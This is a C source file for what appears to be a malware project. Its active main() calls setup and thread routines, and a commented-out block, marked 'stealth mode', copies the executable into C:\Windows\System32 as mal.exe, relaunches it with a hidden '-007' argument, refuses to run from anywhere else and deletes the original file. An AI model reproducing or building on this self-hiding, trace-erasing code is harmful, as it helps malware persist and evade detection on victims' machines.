
#include <stdio.h>

#include "program/program.h"

static void run();

int main(int argc, char** argv) {
    run();
}

static void run() {
    int ret = setup();
    if (ret != ECODE_SUCCESS) {
        printErr(ret);
        programCleanup();
        exit(ret);
    }

    ret = startThreads();
    printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));

    programCleanup();
    exit(0);
}




// ---------------------
// temporarily commented
// ---------------------


// #define EXEC_PATH "C:\\Windows\\System32\\mal.exe"
// #define REQUIRED_ARG "-007"

// static void run(char** argv);
// static void copyAndLaunch();

// int main(int argc, char** argv) {
    
//     if (argc == 1) {
//         copyAndLaunch();
//     } else if (argc == 2) {
//         run(argv);
//     } else {
//         exit(0);
//     }
// }

// static void run(char** argv) {
//     // ensure we are being run from the correct place
//     char* path = argv[0];
//     if (strcmp(path, EXEC_PATH) != 0) { exit(0); }

//     char* arg = argv[1];
//     if (strcmp(arg, REQUIRED_ARG) != 0) { exit(0); }

//     // run the code as normal
//     int ret = setup();
//     if (ret != ECODE_SUCCESS) {
//         printErr(ret);
//         programCleanup();
//         exit(ret);
//     }
    
//     ret = startThreads();
//     printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));

//     programCleanup();

//     exit(0);
// }

// static void copyAndLaunch() {
//     char path[MAX_BUFF_LEN];
//     GetModuleFileNameA(NULL, path, MAX_BUFF_LEN);

//     FILE* original = fopen(path, "r");
//     FILE* target = fopen(EXEC_PATH, "w");
//     if (original == NULL || target == NULL) { exit(1); }

//     int ch;
//     while ((ch = fgetc(original)) != EOF) {
//         fputc(ch, target);
//     }
//     fclose(target);

//     STARTUPINFO si;
//     ZeroMemory( &si, sizeof(si) );
//     si.cb = sizeof(si);

//     PROCESS_INFORMATION pi;
//     ZeroMemory( &pi, sizeof(pi) );

//     // stealth mode hehehe
//     CreateProcessA(EXEC_PATH, "-007", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
//     remove(path);
//     exit(0);
// }
